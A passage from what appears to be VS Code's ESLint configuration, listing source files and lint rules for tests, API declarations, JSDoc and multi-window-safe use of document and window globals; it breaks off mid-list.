			'src/vs/workbench/contrib/extensions/common/extensions.ts',
			'src/vs/workbench/contrib/extensions/electron-browser/runtimeExtensionsEditor.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatActions.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatController.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatStrategies.ts',
			'src/vs/workbench/contrib/markdown/browser/markdownDocumentRenderer.ts',
			'src/vs/workbench/contrib/markers/browser/markers.contribution.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/commands/commands.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/utils.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/editorGutter.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/mergeEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/clipboard/notebookClipboard.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/find/notebookFind.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/layout/layoutActions.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/profile/notebookProfile.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/troubleshoot/layout.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/cellChatActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/editActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/notebookIndentationActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/sectionActions.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/diffComponents.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/inlineDiff/notebookDeletedCellDecorator.ts',
			'src/vs/workbench/contrib/notebook/browser/notebookBrowser.ts',
			'src/vs/workbench/contrib/notebook/browser/outputEditor/notebookOutputEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/services/notebookEditorServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/browser/view/notebookCellList.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewMessages.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts',
			'src/vs/workbench/contrib/notebook/browser/viewModel/markupCellViewModel.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookEditorStickyScroll.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookHorizontalTracker.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelQuickPickStrategy.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookCellTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookMetadataTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/notebookCommon.ts',
			'src/vs/workbench/contrib/notebook/common/notebookEditorModelResolverServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/test/browser/testNotebookEditor.ts',
			'src/vs/workbench/contrib/performance/electron-browser/startupProfiler.ts',
			'src/vs/workbench/contrib/preferences/browser/preferences.contribution.ts',
			'src/vs/workbench/contrib/preferences/browser/preferencesRenderers.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsEditor2.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTreeModels.ts',
			'src/vs/workbench/contrib/remote/browser/tunnelView.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/searchNotebookHelpers.ts',
			'src/vs/workbench/contrib/search/browser/replace.ts',
			'src/vs/workbench/contrib/search/browser/replaceService.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsCopy.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsBase.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsFind.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsNav.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsRemoveReplace.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTextQuickAccess.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTopBar.ts',
			'src/vs/workbench/contrib/search/browser/searchMessage.ts',
			'src/vs/workbench/contrib/search/browser/searchResultsView.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/fileMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/folderMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchModel.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchResult.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchTreeCommon.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/textSearchHeading.ts',
			'src/vs/workbench/contrib/search/browser/searchView.ts',
			'src/vs/workbench/contrib/search/test/browser/mockSearchTree.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditor.contribution.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorActions.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorInput.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/configureSnippets.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/insertSnippet.ts',
			'src/vs/workbench/contrib/snippets/browser/snippetsService.ts',
			'src/vs/workbench/contrib/testing/common/storedValue.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/typeHierarchy/browser/typeHierarchy.contribution.ts',
			'src/vs/workbench/contrib/typeHierarchy/common/typeHierarchy.ts',
			'src/vs/workbench/contrib/webview/browser/overlayWebview.ts',
			'src/vs/workbench/contrib/webview/browser/webview.ts',
			'src/vs/workbench/contrib/webview/browser/webviewElement.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditor.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditorInputSerializer.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewWorkbenchService.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStartedService.ts',
			'src/vs/workbench/contrib/welcomeWalkthrough/browser/walkThroughPart.ts',
			'src/vs/workbench/services/authentication/common/authentication.ts',
			'src/vs/workbench/services/authentication/test/browser/authenticationQueryServiceMocks.ts',
			'src/vs/workbench/services/commands/common/commandService.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolver.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolverExpression.ts',
			'src/vs/workbench/services/extensions/common/extensionHostManager.ts',
			'src/vs/workbench/services/extensions/common/extensionsRegistry.ts',
			'src/vs/workbench/services/extensions/common/lazyPromise.ts',
			'src/vs/workbench/services/extensions/common/polyfillNestedWorker.protocol.ts',
			'src/vs/workbench/services/extensions/common/rpcProtocol.ts',
			'src/vs/workbench/services/extensions/worker/polyfillNestedWorker.ts',
			'src/vs/workbench/services/keybinding/browser/keybindingService.ts',
			'src/vs/workbench/services/keybinding/browser/keyboardLayoutService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingEditing.ts',
			'src/vs/workbench/services/keybinding/common/keymapInfo.ts',
			'src/vs/workbench/services/language/common/languageService.ts',
			'src/vs/workbench/services/outline/browser/outline.ts',
			'src/vs/workbench/services/outline/browser/outlineService.ts',
			'src/vs/workbench/services/preferences/common/preferences.ts',
			'src/vs/workbench/services/preferences/common/preferencesModels.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/replace.ts',
			'src/vs/workbench/services/search/common/search.ts',
			'src/vs/workbench/services/search/common/searchExtConversionTypes.ts',
			'src/vs/workbench/services/search/common/searchExtTypes.ts',
			'src/vs/workbench/services/search/node/fileSearch.ts',
			'src/vs/workbench/services/search/node/rawSearchService.ts',
			'src/vs/workbench/services/search/node/ripgrepTextSearchEngine.ts',
			'src/vs/workbench/services/textMate/common/TMGrammarFactory.ts',
			'src/vs/workbench/services/themes/browser/fileIconThemeData.ts',
			'src/vs/workbench/services/themes/browser/productIconThemeData.ts',
			'src/vs/workbench/services/themes/common/colorThemeData.ts',
			'src/vs/workbench/services/themes/common/plistParser.ts',
			'src/vs/workbench/services/themes/common/themeExtensionPoints.ts',
			'src/vs/workbench/services/themes/common/workbenchThemeService.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/workbench/test/common/workbenchTestServices.ts',
			'src/vs/workbench/test/electron-browser/workbenchTestServices.ts',
			// Server
			'src/vs/server/node/remoteAgentEnvironmentImpl.ts',
			'src/vs/server/node/remoteExtensionHostAgentServer.ts',
			'src/vs/server/node/remoteExtensionsScanner.ts',
			// Tests
			'**/*.test.ts',
			'**/*.integrationTest.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': false
				}
			]
		}
	},
	// Tests
	{
		files: [
			'**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-must-use-super-dispose': 'off',
			'local/code-no-test-only': 'error',
			'local/code-no-test-async-suite': 'warn',
			'local/code-must-use-result': [
				'warn',
				[
					{
						'message': 'Expression must be awaited',
						'functions': [
							'assertSnapshot',
							'assertHeap'
						]
					}
				]
			]
		}
	},
	// vscode tests specific rules
	{
		files: [
			'src/vs/**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-ensure-no-disposables-leak-in-test': [
				'warn',
				{
					// Files should (only) be removed from the list they adopt the leak detector
					'exclude': [
						'src/vs/workbench/services/userActivity/test/browser/domActivityTracker.test.ts',
					]
				}
			]
		}
	},
	// git extension - ban non-type imports from git.d.ts (use git.constants for runtime values)
	{
		files: [
			'extensions/git/src/**/*.ts',
		],
		ignores: [
			'extensions/git/src/api/git.constants.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-imports': 'off',
			'@typescript-eslint/no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['*/api/git'],
							'allowTypeImports': true,
							'message': 'Use \'import type\' for types from git.d.ts and import runtime const enum values from git.constants instead'
						},
					]
				}
			]
		}
	},
	// vscode API
	{
		files: [
			'**/vscode.d.ts',
			'**/vscode.proposed.*.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `TSArrayType > TSUnionType`,
					'message': 'Use Array<...> for arrays of union types.'
				},
			],
			'local/vscode-dts-create-func': 'warn',
			'local/vscode-dts-literal-or-types': 'warn',
			'local/vscode-dts-string-type-literals': 'warn',
			'local/vscode-dts-interface-naming': 'warn',
			'local/vscode-dts-cancellation': 'warn',
			'local/vscode-dts-use-export': 'warn',
			'local/vscode-dts-use-thenable': 'warn',
			'local/vscode-dts-vscode-in-comments': 'warn',
			'local/vscode-dts-provider-naming': [
				'warn',
				{
					'allowed': [
						'FileSystemProvider',
						'TreeDataProvider',
						'TestProvider',
						'CustomEditorProvider',
						'CustomReadonlyEditorProvider',
						'TerminalLinkProvider',
						'AuthenticationProvider',
						'NotebookContentProvider'
					]
				}
			],
			'local/vscode-dts-event-naming': [
				'warn',
				{
					'allowed': [
						'onCancellationRequested',
						'event'
					],
					'verbs': [
						'accept',
						'archive',
						'change',
						'close',
						'collapse',
						'create',
						'delete',
						'lock',
						'resume',
						'shutdown',
						'suspend',
						'unlock',
						'discover',
						'dispose',
						'drop',
						'edit',
						'end',
						'execute',
						'expand',
						'grant',
						'hide',
						'invalidate',
						'open',
						'override',
						'perform',
						'receive',
						'register',
						'remove',
						'rename',
						'save',
						'send',
						'start',
						'terminate',
						'trigger',
						'unregister',
						'write',
						'commit'
					]
				}
			]
		}
	},
	// vscode.d.ts
	{
		files: [
			'**/vscode.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'jsdoc/tag-lines': 'off',
			'jsdoc/valid-types': 'off',
			'jsdoc/no-multi-asterisks': [
				'warn',
				{
					'allowWhitespace': true
				}
			],
			'jsdoc/require-jsdoc': [
				'warn',
				{
					'enableFixer': false,
					'contexts': [
						'TSInterfaceDeclaration',
						'TSPropertySignature',
						'TSMethodSignature',
						'TSDeclareFunction',
						'ClassDeclaration',
						'MethodDefinition',
						'PropertyDeclaration',
						'TSEnumDeclaration',
						'TSEnumMember',
						'ExportNamedDeclaration'
					]
				}
			],
			'jsdoc/check-param-names': [
				'warn',
				{
					'enableFixer': false,
					'checkDestructured': false
				}
			],
			'jsdoc/require-returns': 'warn'
		}
	},
	// common/browser layer
	{
		files: [
			'src/**/{common,browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-amd-node-module': 'warn'
		}
	},
	// node/electron layer
	{
		files: [
			'src/*.ts',
			'src/**/{node,electron-main,electron-utility}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				// Below are globals that are unsupported in ESM
				'__dirname',
				'__filename',
				'require'
			]
		}
	},
	// electron-main layer: prevent static imports of heavy node_modules
	// that would be synchronously loaded on startup
	{
		files: [
			'src/vs/code/electron-main/**/*.ts',
			'src/vs/code/node/**/*.ts',
			'src/vs/platform/*/electron-main/**/*.ts',
			'src/vs/platform/*/node/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-static-node-module-import': [
				'error',
				// Files that run in separate processes, not on the electron-main startup path
				'src/vs/platform/agentHost/node/**/*.ts',
				'src/vs/platform/files/node/watcher/**/*.ts',
				'src/vs/platform/terminal/node/**/*.ts',
				// Files that use small, safe modules
				'src/vs/platform/environment/node/argv.ts',
			]
		}
	},
	// browser/electron-browser layer
	{
		files: [
			'src/**/{browser,electron-browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-global-document-listener': 'warn',
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='MouseEvent']`,
					'message': 'Use DOM.isMouseEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^HTML\\w+/]`,
					'message': 'Use DOM.isHTMLElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^SVG\\w+/]`,
					'message': 'Use DOM.isSVGElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='KeyboardEvent']`,
					'message': 'Use DOM.isKeyboardEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='PointerEvent']`,
					'message': 'Use DOM.isPointerEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='DragEvent']`,
					'message': 'Use DOM.isDragEvent() to support multi-window scenarios.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='activeElement']`,
					'message': 'Use <targetWindow>.document.activeElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='contains']`,
					'message': 'Use <targetWindow>.document.contains to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='styleSheets']`,
					'message': 'Use <targetWindow>.document.styleSheets to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='fullscreenElement']`,
					'message': 'Use <targetWindow>.document.fullscreenElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='body']`,
					'message': 'Use <targetWindow>.document.body to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='addEventListener']`,
					'message': 'Use <targetWindow>.document.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='removeEventListener']`,
					'message': 'Use <targetWindow>.document.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='hasFocus']`,
					'message': 'Use <targetWindow>.document.hasFocus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='head']`,
					'message': 'Use <targetWindow>.document.head to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='exitFullscreen']`,
					'message': 'Use <targetWindow>.document.exitFullscreen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementById']`,
					'message': 'Use <targetWindow>.document.getElementById to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByClassName']`,
					'message': 'Use <targetWindow>.document.getElementsByClassName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByName']`,
					'message': 'Use <targetWindow>.document.getElementsByName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagName']`,
					'message': 'Use <targetWindow>.document.getElementsByTagName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagNameNS']`,
					'message': 'Use <targetWindow>.document.getElementsByTagNameNS to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getSelection']`,
					'message': 'Use <targetWindow>.document.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='open']`,
					'message': 'Use <targetWindow>.document.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='close']`,
					'message': 'Use <targetWindow>.document.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='documentElement']`,
					'message': 'Use <targetWindow>.document.documentElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='visibilityState']`,
					'message': 'Use <targetWindow>.document.visibilityState to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelector']`,
					'message': 'Use <targetWindow>.document.querySelector to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelectorAll']`,
					'message': 'Use <targetWindow>.document.querySelectorAll to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementFromPoint']`,
					'message': 'Use <targetWindow>.document.elementFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementsFromPoint']`,
					'message': 'Use <targetWindow>.document.elementsFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeydown']`,
					'message': 'Use <targetWindow>.document.onkeydown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeyup']`,
					'message': 'Use <targetWindow>.document.onkeyup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmousedown']`,
					'message': 'Use <targetWindow>.document.onmousedown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmouseup']`,
					'message': 'Use <targetWindow>.document.onmouseup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='execCommand']`,
					'message': 'Use <targetWindow>.document.execCommand to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelector\']',
					'message': 'querySelector should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelectorAll\']',
					'message': 'querySelectorAll should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementById\']',
					'message': 'getElementById should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByClassName\']',
					'message': 'getElementsByClassName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagName\']',
					'message': 'getElementsByTagName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByName\']',
					'message': 'getElementsByName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagNameNS\']',
					'message': 'getElementsByTagNameNS should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				}
			],
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				{
					'name': 'setInterval',
					'message': 'Use <targetWindow>.setInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'clearInterval',
					'message': 'Use <targetWindow>.clearInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestAnimationFrame',
					'message': 'Use <targetWindow>.requestAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelAnimationFrame',
					'message': 'Use <targetWindow>.cancelAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestIdleCallback',
					'message': 'Use <targetWindow>.requestIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelIdleCallback',
					'message': 'Use <targetWindow>.cancelIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'window',
					'message': 'Use <targetWindow> to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'addEventListener',
					'message': 'Use <targetWindow>.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'removeEventListener',
					'message': 'Use <targetWindow>.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getComputedStyle',
					'message': 'Use <targetWindow>.getComputedStyle to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'focus',
					'message': 'Use <targetWindow>.focus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'blur',
					'message': 'Use <targetWindow>.blur to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'close',
					'message': 'Use <targetWindow>.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'dispatchEvent',
					'message': 'Use <targetWindow>.dispatchEvent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getSelection',
					'message': 'Use <targetWindow>.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'matchMedia',
					'message': 'Use <targetWindow>.matchMedia to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'open',
					'message': 'Use <targetWindow>.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'parent',
					'message': 'Use <targetWindow>.parent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'postMessage',
					'message': 'Use <targetWindow>.postMessage to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'devicePixelRatio',
					'message': 'Use <targetWindow>.devicePixelRatio to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frames',
					'message': 'Use <targetWindow>.frames to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frameElement',
					'message': 'Use <targetWindow>.frameElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerHeight',
					'message': 'Use <targetWindow>.innerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerWidth',
					'message': 'Use <targetWindow>.innerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerHeight',
					'message': 'Use <targetWindow>.outerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerWidth',
					'message': 'Use <targetWindow>.outerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'opener',
